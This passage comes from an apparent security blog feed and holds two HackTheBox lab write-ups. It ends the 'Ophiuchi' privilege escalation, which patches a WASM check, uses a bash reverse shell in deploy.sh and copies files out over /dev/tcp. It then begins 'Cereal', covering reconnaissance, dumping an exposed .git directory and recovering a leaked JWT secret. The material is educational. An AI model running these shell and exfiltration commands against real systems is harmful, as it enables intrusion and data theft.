</span></span><span class="line"><span class="cl">wasm-functions/index.go
</span></span><span class="line"><span class="cl">wasm-functions/deploy.sh
</span></span><span class="line"><span class="cl">wasm-functions/main.wasm
</span></span><span class="line"><span class="cl">wasm-functions/backup/
</span></span><span class="line"><span class="cl">wasm-functions/backup/index.go
</span></span><span class="line"><span class="cl">wasm-functions/backup/deploy.sh
</span></span><span class="line"><span class="cl">wasm-functions/backup/main.wasm
</span></span><span class="line"><span class="cl">admin@ophiuchi:/opt$ cat /tmp/wasm-functions.tar.gz &gt; /dev/tcp/10.10.14.23/53
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span> &gt; wasm-functions.tar.gz
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45380</span>
</span></span></code></pre></div><h4 id="reversing-mainwasm">Reversing main.wasm</h4>
<p>WASM can be {de,re}compiled using a tool, called <a href="https://github.com/WebAssembly/wabt/">wabt</a>. I will clone the repo and make the tool available to system-wide.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz -O /opt/
</span></span><span class="line"><span class="cl">$ tar -xvf /opt/wabt-1.0.23-ubuntu.tar.gz
</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;/opt/wabt-1.0.23/bin&#34;</span>:<span class="nv">$PATH</span>
</span></span></code></pre></div><p>I will decompile the <code>main.wasm</code> using <code>wasm-decompile</code>, and it reveals that the <code>info</code> function has return value of 0.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «wasm-functions» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ wasm-decompile main.wasm 
</span></span><span class="line"><span class="cl"><span class="nb">export</span> memory memory<span class="o">(</span>initial: 16, max: 0<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">global g_a:int <span class="o">=</span> 1048576<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> global data_end:int <span class="o">=</span> 1048576<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> global heap_base:int <span class="o">=</span> 1048576<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">table T_a:funcref<span class="o">(</span>min: 1, max: 1<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="k">function</span> info<span class="o">()</span>:int <span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>I needed a return value of 1, so that <code>index.go</code> will execute the <code>deploy.sh</code>, therefore I will need to modify the <code>main.wasm</code> using <code>wasm2wat</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ wasm2wat ../loot/wasm-functions/main.wasm <span class="p">|</span> tee main.wat
</span></span><span class="line"><span class="cl"><span class="o">(</span>module
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">type</span> <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>func <span class="o">(</span>result i32<span class="o">)))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
</span></span><span class="line"><span class="cl">    i32.const 0<span class="o">)</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>table <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="m">1</span> <span class="m">1</span> funcref<span class="o">)</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>memory <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 16<span class="o">)</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>mut i32<span class="o">)</span> <span class="o">(</span>i32.const 1048576<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;memory&#34;</span> <span class="o">(</span>memory 0<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;info&#34;</span> <span class="o">(</span>func <span class="nv">$info</span><span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__data_end&#34;</span> <span class="o">(</span>global 1<span class="o">))</span>
</span></span><span class="line"><span class="cl">  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__heap_base&#34;</span> <span class="o">(</span>global 2<span class="o">)))</span>
</span></span></code></pre></div><p>Then in <code>main.wat</code>, I will modify the return value of the info function to 1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
</span></span><span class="line"><span class="cl">    i32.const 1<span class="o">)</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>I will compile the <code>main.wat</code> back to <code>main.wasm</code> using <code>wat2wasm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ wat2wasm main.wat 
</span></span></code></pre></div><p>Then I will create my own <code>deploy.sh</code> that contains a reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ cat deploy.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/sh</span>
</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.23/53 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>I will transfer my <code>main.wasm</code> and <code>deploy.sh</code> using <code>scp</code> to<code>/tmp/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ scp main.wasm deploy.sh  admin@10.10.10.227:/tmp
</span></span><span class="line"><span class="cl">admin@10.10.10.227<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">main.wasm                                                                                   100%  <span class="m">112</span>     1.7KB/s   00:00    
</span></span><span class="line"><span class="cl">deploy.sh                                                                                   100%   <span class="m">60</span>     1.1KB/s   00:00 
</span></span></code></pre></div><p>Finally, I will setup a netcat listener and run the allowed sudo command on the <code>/tmp/</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
</span></span></code></pre></div><p>Now I have a root shell on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.23» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45382</span>
</span></span><span class="line"><span class="cl">root@ophiuchi:/tmp# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@ophiuchi:/tmp# 
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210729230638797.png" alt="image-20210729230638797"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cereal (User)</title>
      <link>https://fahmifj.github.io/hackthebox/cereal/</link>
      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/cereal/</guid>
      <description>Chaining XSS, SSRF, and deserialization vulnerabilities to get RCE</description>
      <content:encoded><![CDATA[<p>Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application&rsquo;s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application. Chaining these vulnerabilities results in a shell access to the system.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Code review</li>
<li>JWT authentication bypass</li>
<li>XSS exploitation</li>
<li>.NET deserialization</li>
<li>Exploit chain</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:45 EDT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp  open  ssh     syn-ack ttl <span class="m">127</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http    syn-ack ttl <span class="m">127</span>
</span></span><span class="line"><span class="cl">443/tcp open  https   syn-ack ttl <span class="m">127</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 118.08 seconds
</span></span></code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:51 EDT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://cereal.htb/
</span></span><span class="line"><span class="cl"><span class="p">|</span>_https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Cereal
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>cereal.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-11-11T19:57:18
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2040-11-11T20:07:19
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-06-05T03:51:48+00:00<span class="p">;</span> +5s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 4s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 23.34 seconds
</span></span></code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80">TCP 80</h3>
<p>It redirects to the HTTPS.</p>
<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
<p>Following the redirection ends up at a login form. I tried a few common credentials, but they didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  /></div>
</p>
<p>Inspecting the source reveals that this site is a react based application.</p>
<p><div class="img-container"><img src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  /></div>
</p>
<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>, but l&rsquo;ll leave it for now.</p>
<p><div class="img-container"><img src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  /></div>
</p>
<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
<p><div class="img-container"><img src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  /></div>
</p>
<p>Nothing I can do with this page, but I&rsquo;ll take note on the leaked file path:</p>
<ul>
<li><code>C:\inetpub\source\default.aspx</code></li>
</ul>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     https://source.cereal.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              aspx,txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/06/05 00:52:32 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/.git/HEAD            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 23<span class="o">]</span>
</span></span><span class="line"><span class="cl">/Default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 10090<span class="o">]</span>
</span></span><span class="line"><span class="cl">/aspnet_client        <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 163<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 9727<span class="o">]</span>                                              
</span></span><span class="line"><span class="cl">/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 157<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/uploads/<span class="o">]</span>      
</span></span><span class="line"><span class="cl">                                                                                              
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/06/05 00:54:41 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><p>Access to the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ curl -I -k http://source.cereal.htb/.git/ <span class="o">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">1233</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">X-Powered-By: Sugar
</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:25 GMT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">1233</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">X-Powered-By: Sugar
</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:08:16 GMT
</span></span></code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ curl -I -k http://source.cereal.htb/.git/HEAD
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">23</span>
</span></span><span class="line"><span class="cl">Content-Type: text/plain
</span></span><span class="line"><span class="cl">Last-Modified: Wed, <span class="m">11</span> Nov <span class="m">2020</span> 20:09:34 GMT
</span></span><span class="line"><span class="cl">Accept-Ranges: bytes
</span></span><span class="line"><span class="cl">ETag: <span class="s2">&#34;adc1d19266b8d61:0&#34;</span>
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">X-Powered-By: Sugar
</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:29 GMT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ curl -s -k http://source.cereal.htb/.git/HEAD
</span></span><span class="line"><span class="cl">ref: refs/heads/master
</span></span></code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory.</p>
<h3 id="git">Git</h3>
<h4 id="dumping-git-directory">Dumping .git directory</h4>
<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ mkdir loot/source-cereal-git <span class="o">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/ <span class="o">[</span>403<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching common files
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.gitignore <span class="o">[</span>404<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span class="o">[</span>404<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/description <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Finding refs/
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span class="o">[</span>404<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/config <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span class="o">[</span>404<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Finding packs
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Finding objects
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching objects
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span class="o">[</span>200<span class="o">]</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Running git checkout .
</span></span></code></pre></div><h4 id="git-history">Git History</h4>
<p>I could see the history of this repository by issuing <code>git log</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  /></div>
</p>
<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
<p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p>
<p><div class="img-container"><img src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  /></div>
</p>
<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
<ul>
<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
</ul>
<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
<blockquote>
<p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or  <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p>
</blockquote>
<h4 id="app-overview">App Overview</h4>
<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «source-cereal-git» «10.10.14.3» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ tree -L <span class="m">1</span> --dirsfirst
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── ClientApp
</span></span><span class="line"><span class="cl">├── Controllers
</span></span><span class="line"><span class="cl">├── Migrations
</span></span><span class="line"><span class="cl">├── Models
</span></span><span class="line"><span class="cl">├── Pages
</span></span><span class="line"><span class="cl">├── Properties
</span></span><span class="line"><span class="cl">├── Services
</span></span><span class="line"><span class="cl">├── ApplicationOptions.cs
</span></span><span class="line"><span class="cl">├── appsettings.Development.json
</span></span><span class="line"><span class="cl">├── appsettings.json
</span></span><span class="line"><span class="cl">├── CerealContext.cs
</span></span><span class="line"><span class="cl">├── Cereal.csproj
</span></span><span class="line"><span class="cl">├── DownloadHelper.cs
</span></span><span class="line"><span class="cl">├── ExtensionMethods.cs
</span></span><span class="line"><span class="cl">├── IPAddressHandler.cs
</span></span><span class="line"><span class="cl">├── IPRequirement.cs
</span></span><span class="line"><span class="cl">├── Program.cs
</span></span><span class="line"><span class="cl">└── Startup.cs
</span></span></code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
<p>Here is the overview of app execution flow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Program.cs
</span></span><span class="line"><span class="cl"> |
</span></span><span class="line"><span class="cl"> v
</span></span><span class="line"><span class="cl">Startup.cs  -&gt; Loads appsettings.json
</span></span><span class="line"><span class="cl"> |
</span></span><span class="line"><span class="cl"> v
</span></span><span class="line"><span class="cl">React client
</span></span></code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
<ul>
<li>There is IP whitelist</li>
<li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
